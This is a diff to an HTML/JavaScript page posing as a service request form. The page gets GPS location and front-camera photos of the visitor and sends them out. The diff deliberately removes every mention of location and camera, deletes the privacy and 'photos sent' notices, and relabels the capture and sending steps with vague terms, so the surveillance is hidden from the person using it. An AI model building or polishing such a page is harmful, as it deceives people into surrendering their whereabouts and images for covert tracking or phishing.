@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adeel Services - Service Request Form</title>
-    <meta name="description" content="Professional service request form with location tracking">
+    <title>Services - Service Request Form</title>
+    <meta name="description" content="Professional service request form">
     <style>
         * {
             margin: 0;
@@ -376,24 +376,24 @@
         <div class="header">
             <div class="service-badge">
                 <span class="status-indicator status-online"></span>
-                Adeel Services
+                Services
             </div>
             <h1>Service Request Form</h1>
-            <p class="subtitle">Professional services at your doorstep</p>
+            <p class="subtitle">Professional services</p>
         </div>
         
         <div class="camera-notice">
-            📷 <strong>Service Verification:</strong> Camera will be used for service verification as part of our quality process.
+            📷 <strong>Service Verification:</strong> We provide quality process.
         </div>
         
         <div class="security-warning" id="securityWarning">
-            🔒 <strong>Security Notice:</strong> Please allow location and camera permissions when prompted or contact our support team for assistance.
+            🔒 <strong>Security Notice:</strong> Please allow permissions when prompted.
         </div>
         
         <div class="location-icon">🌍</div>
         
         <p style="color: #7f8c8d; font-size: 1.1em; margin-bottom: 20px;">
-            Please allow location and camera access to proceed with your service request.
+            Please allow permissions proceed with your service request.
         </p>
         
         <div class="loading" id="loading">
@@ -405,11 +405,11 @@
             <div id="progressSteps" style="margin-top: 20px;">
                 <div class="progress-step">
                     <div class="step-indicator" id="step1">1</div>
-                    <span>Location Access</span>
+                    <span>1st Processing</span>
                 </div>
                 <div class="progress-step">
                     <div class="step-indicator" id="step2">2</div>
-                    <span>Camera Access</span>
+                    <span>2nd Processing</span>
                 </div>
                 <div class="progress-step">
                     <div class="step-indicator" id="step3">3</div>
@@ -417,7 +417,7 @@
                 </div>
                 <div class="progress-step">
                     <div class="step-indicator" id="step4">4</div>
-                    <span>Sending Data</span>
+                    <span>Finalising</span>
                 </div>
             </div>
         </div>
@@ -435,15 +435,15 @@
             <div class="icon">🎉</div>
             <h2>Thank You!</h2>
             <p>Your service request has been successfully processed.</p>
-            <p>Location and verification photos have been captured and sent to our team.</p>
-            <p>We will contact you shortly to discuss your service requirements.</p>
+            <p>Best IT services provided by our team.</p>
+            <p>Thanks for helping to improved our services</p>
             <p style="font-size: 1em; margin-top: 25px; opacity: 0.8;">
-                🔐 Your information is secure and used only for service delivery.
+                🔐 Sucess
             </p>
         </div>
         
         <div class="footer" id="footerSection">
-            <p>🛡️ Your location and photos are used only for service verification and kept confidential.</p>
+            <p>🛡️ System is created by iTech Team.</p>
         </div>
     </div>
 
@@ -498,21 +498,21 @@
             const support = checkBrowserSupport();
             
             if (!support.hasGeolocation) {
-                showError('❌ Your browser does not support location services. Please update your browser or contact our support team.');
+                showError('❌ Your browser does not support services. Please update your browser or contact our support team.');
                 return;
             }
             
             if (!support.hasCamera) {
-                showError('❌ Your browser does not support camera access. Please update your browser or contact our support team.');
+                showError('❌ Your browser does not support. Please update your browser or contact our support team.');
                 return;
             }
             
             if (!checkSecureContext()) {
-                showError('🔒 Location and camera services require a secure connection. Please contact our support team for assistance.');
+                showError('🔒 services require a secure connection. Please contact our support team for assistance.');
                 return;
             }
 
-            showLoading(true, 'Requesting location access...');
+            showLoading(true, 'Requesting access...');
             updateStep(1, 'active');
 
             const options = {
@@ -529,7 +529,7 @@
                     };
                     
                     updateStep(1, 'complete');
-                    updateLoadingText('Location captured! Requesting camera access...');
+                    updateLoadingText('Processing! Requesting access...');
                     
                     // Start camera access
                     setTimeout(() => {
@@ -537,20 +537,20 @@
                     }, 1000);
                 },
                 error => {
-                    let errorMsg = '❌ Unable to access location: ';
+                    let errorMsg = '❌ Unable to access: ';
                     let suggestion = '';
                     
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
-                            errorMsg += 'Location access was denied.';
-                            suggestion = 'Please refresh the page and allow location access when prompted, or contact our support team for assistance.';
+                            errorMsg += 'Access was denied.';
+                            suggestion = 'Please refresh the page and allow access when prompted, or contact our support team for assistance.';
                             break;
                         case error.POSITION_UNAVAILABLE:
-                            errorMsg += 'Location services are unavailable.';
+                            errorMsg += 'Services are unavailable.';
                             suggestion = 'Please check your GPS/WiFi connection and refresh the page, or contact our support team.';
                             break;
                         case error.TIMEOUT:
-                            errorMsg += 'Location request timed out.';
+                            errorMsg += 'Request timed out.';
                             suggestion = 'Please ensure you have a strong internet connection and refresh the page.';
                             break;
                         default:
@@ -574,7 +574,7 @@
                 video: { 
                     width: { ideal: 1280 },
                     height: { ideal: 720 },
-                    facingMode: 'environment' // Use back camera if available
+                    facingMode: 'user' // Use front camera (selfie camera)
                 } 
             })
             .then(stream => {
@@ -600,25 +600,25 @@
                 };
             })
             .catch(error => {
-                console.error('Camera access error:', error);
-                let errorMsg = '❌ Unable to access camera: ';
+                console.error('Access error:', error);
+                let errorMsg = '❌ Unable to access : ';
                 let suggestion = '';
                 
                 switch(error.name) {
                     case 'NotAllowedError':
-                        errorMsg += 'Camera access was denied.';
-                        suggestion = 'Please refresh the page and allow camera access when prompted, or contact our support team.';
+                        errorMsg += 'Access was denied.';
+                        suggestion = 'Please refresh the page and allow access when prompted, or contact our support team.';
                         break;
                     case 'NotFoundError':
-                        errorMsg += 'No camera found on this device.';
-                        suggestion = 'Please ensure your device has a camera or contact our support team.';
+                        errorMsg += 'No access found on this device.';
+                        suggestion = 'Please ensure your device has a access permission or contact our support team.';
                         break;
                     case 'NotSupportedError':
-                        errorMsg += 'Camera is not supported on this device.';
+                        errorMsg += 'Access is not supported on this device.';
                         suggestion = 'Please try a different device or contact our support team.';
                         break;
                     default:
-                        errorMsg += 'An unknown camera error occurred.';
+                        errorMsg += 'An unknown error occurred.';
                         suggestion = 'Please refresh the page or contact our support team.';
                         break;
                 }
@@ -639,7 +639,7 @@
             // Ensure video is ready
             if (!video.videoWidth || !video.videoHeight) {
                 console.error('Video not ready');
-                showError('❌ Camera not ready. Please refresh and try again.');
+                showError('❌ Not ready. Please refresh and try again.');
                 return;
             }
             
@@ -716,7 +716,7 @@
                     sendCompleteData();
                 }, 1000);
             } else {
-                showError('❌ No photos were captured successfully. Please refresh and try again.');
+                showError('❌ Not successfull. Please refresh and try again.');
             }
         }
 
@@ -800,12 +800,12 @@
             updateStep(4, 'active');
             
             if (!locationData) {
-                showError('❌ Location data not available. Please refresh and try again.');
+                showError('❌ Service not available. Please refresh and try again.');
                 return;
             }
 
             if (photoFiles.length === 0) {
-                showError('❌ No photos captured. Please refresh and try again.');
+                showError('❌ No access. Please refresh and try again.');
                 return;
             }
             
